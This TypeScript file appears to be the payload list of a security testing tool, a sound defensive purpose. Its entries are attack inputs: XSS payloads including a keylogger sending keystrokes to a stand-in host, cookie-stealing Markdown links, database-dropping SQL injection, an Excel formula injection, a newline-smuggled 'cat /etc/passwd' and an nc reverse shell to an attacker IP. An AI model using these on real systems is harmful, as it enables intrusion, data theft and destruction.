import { SeverityLevel } from '../../severity-level.js';
import { AttackPayload } from '../attack-payload.js';

export const COMMON: AttackPayload[] = [
    {
        severity: SeverityLevel.HIGH,
        messages: ['Basic XSS injection'],
        payload: '<script></script>',
        tags: ['xss', 'basic']
    },
    {
        severity: SeverityLevel.HIGH,
        messages: ['JavaScript keylogger through advanced XSS'],
        payload: `<img src=x onerror='document.onkeypress=function(e){fetch("http://domain.com?k="+String.fromCharCode(e.which))},this.remove();'>`,
        tags: ['xss', 'advanced', 'keylogger']
    },
    {
        severity: SeverityLevel.HIGH,
        messages: ['SVG payload XSS injection'],
        payload: '<svgonload=alert(1)>',
        tags: ['xss', 'advanced', 'svg']
    },
    {
        severity: SeverityLevel.HIGH,
        messages: ['DIV payload XSS injection'],
        payload: 'Hello<div onpointerout="alert(45)">World</div>',
        tags: ['xss', 'advanced', 'div'],
    },
    {
        severity: SeverityLevel.HIGH,
        messages: ['Basic SQL injection'],
        payload: '"; DROP ALL DATABASES; --',
        tags: ['sql', 'basic']
    },
    {
        severity: SeverityLevel.HIGH,
        messages: ['Advanced MySQL injection'],
        payload: `1' ORDER BY 1--+`,
        tags: ['sql', 'mysql', 'advanced']
    },
    {
        severity: SeverityLevel.HIGH,
        messages: ['Advanced PostgreSQL injection'],
        payload: `';create table persistent (data varchar(200));--`,
        tags: ['sql', 'postgresql', 'advanced']
    },
    {
        severity: SeverityLevel.MEDIUM,
        messages: ['CSV Excel formula injection'],
        payload: `=cmd|' /C notepad'!'A1'`,
        tags: ['csv', 'excel', 'formula', 'advanced']
    },
    {
        severity: SeverityLevel.MEDIUM,
        messages: ['NodeJS RCE assuming eval() afterwards'],
        payload: `require("child_process").exec('nc <IP Attacker> 4445 -e /bin/sh')`,
        tags: ['eval', 'rce']
    },
    {
        severity: SeverityLevel.MEDIUM,
        messages: [`NodeJS RCE assuming eval() afterwards`],
        payload: `something%0Acat%20/etc/passwd`,
        tags: ['eval', 'rce']
    },
    {
        severity: SeverityLevel.MEDIUM,
        messages: [`XSS bypass attempt for Markdown parsers`],
        payload: `[a](javascript:prompt(document.cookie))`,
        tags: ['xss', 'markdown']
    },
    {
        severity: SeverityLevel.MEDIUM,
        messages: [`XSS bypass attempt for Markdown parsers`],
        payload: `[a](j a v a s c r i p t:prompt(document.cookie))`,
        tags: ['xss', 'markdown']
    },
    {
        severity: SeverityLevel.MEDIUM,
        messages: [`XSS bypass attempt for Markdown parsers`],
        payload: `[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)`,
        tags: ['xss', 'markdown']
    },
    {
        severity: SeverityLevel.MEDIUM,
        messages: [`XSS bypass attempt for Markdown parsers`],
        payload: `[a](javascript:window.onerror=alert;throw%201)`,
        tags: ['xss', 'markdown']
    },
    {
        severity: SeverityLevel.MEDIUM,
        messages: ['XSS known WAF bypass'],
        payload: 'anythinglr00</script><script>alert(document.domain)</script>uxldz',
        tags: ['xss', 'waf-bypass']
    }
    // Not possible now due to lack of output formatting
    /*{
        severity: SeverityLevel.LOW,
        messages: ['Oversized string size'],
        payload: 'x'.repeat(10*1024*1024),
        tags: ['overflow']
    }*/
];
